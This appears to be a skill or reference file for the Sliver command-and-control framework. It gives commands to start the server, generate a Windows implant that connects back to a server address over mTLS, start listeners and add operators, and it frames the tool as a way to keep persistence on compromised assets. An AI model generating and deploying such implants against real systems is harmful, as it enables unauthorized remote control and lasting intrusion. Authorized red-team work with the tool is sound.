---
name: sliver
description: A general-purpose cross-platform implant framework for Command and Control (C2). It supports communication over Mutual-TLS, HTTP(S), and DNS, featuring dynamically compiled implants with unique X.509 certificates. Use during exploitation and post-exploitation phases to maintain persistence, execute remote commands, and manage compromised assets across different operating systems.
---

# sliver

## Overview
Sliver is a powerful, cross-platform implant framework designed for red team operations. It provides a server-client architecture where the server manages listeners and implants, while the client provides the interface for operators. It supports multiple C2 protocols and generates unique, obfuscated binaries for each deployment. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume Sliver is already installed. If the commands are missing:

```bash
sudo apt update
sudo apt install sliver
```

## Common Workflows

### Starting the Server and Client
First, start the server (usually in a dedicated terminal or as a daemon):
```bash
sudo sliver-server
```
Then, in another terminal, run the client to interact with the server:
```bash
sliver-client
```

### Generating a Basic Implant
Inside the sliver shell, generate a simple executable implant for Windows using MTLS:
```sliver
generate --mtls <SERVER_IP> --os windows --arch amd64
```

### Starting a Listener
To receive connections from the generated implant, start a listener on the server:
```sliver
mtls
```

### Managing Operators
To allow another user to connect to your sliver server, generate a configuration file:
```bash
sliver-server operator --name kali-user --lhost <SERVER_IP> --save kali-user.cfg
```
The other user can then use `sliver-client import kali-user.cfg`.

## Complete Command Reference

### sliver-client
The primary interface for interacting with the Sliver C2 server.

**Usage:** `sliver-client [command] [flags]`

| Command | Description |
|---------|-------------|
| `completion` | Generate the autocompletion script for the specified shell |
| `help` | Help about any command |
| `import` | Import a client configuration file |
| `version` | Print version and exit |

**Flags:**
- `-h, --help`: Help for sliver-client

---

### sliver-server
The backend server that manages the database, listeners, and implant generation.

**Usage:** `sliver-server [command] [flags]`

| Command | Description |
|---------|-------------|
| `builder` | Start the process as an external builder |
| `completion` | Generate the autocompletion script for the specified shell |
| `daemon` | Force start server in daemon mode |
| `export-ca` | Export certificate authority |
| `help` | Help about any command |
| `import-ca` | Import certificate authority |
| `operator` | Generate operator configuration files |
| `unpack` | Unpack assets and exit |
| `version` | Print version and exit |

**Flags:**
- `-h, --help`: Help for sliver-server

---

### Internal Sliver Shell Commands
Once inside the `sliver` console, the following primary categories of commands are available (non-exhaustive list of common internal commands):

| Command | Description |
|---------|-------------|
| `generate` | Generate a new sliver implant binary |
| `mtls` | Start/Stop an MTLS listener |
| `http` | Start/Stop an HTTP listener |
| `dns` | Start/Stop a DNS listener |
| `implants` | List generated implants |
| `sessions` | List active sessions |
| `use` | Interact with a specific session |
| `jobs` | List background jobs (listeners) |
| `beacons` | List and manage beaconing implants |

## Notes
- **Root Privileges**: `sliver-server` typically requires root privileges to bind to privileged ports (like 443 or 53).
- **Security**: Implants are dynamically compiled with unique X.509 certificates signed by a per-instance CA generated on the first run.
- **Persistence**: Ensure you export your CA or backup the `~/.sliver` directory to maintain control over deployed implants if the server is moved.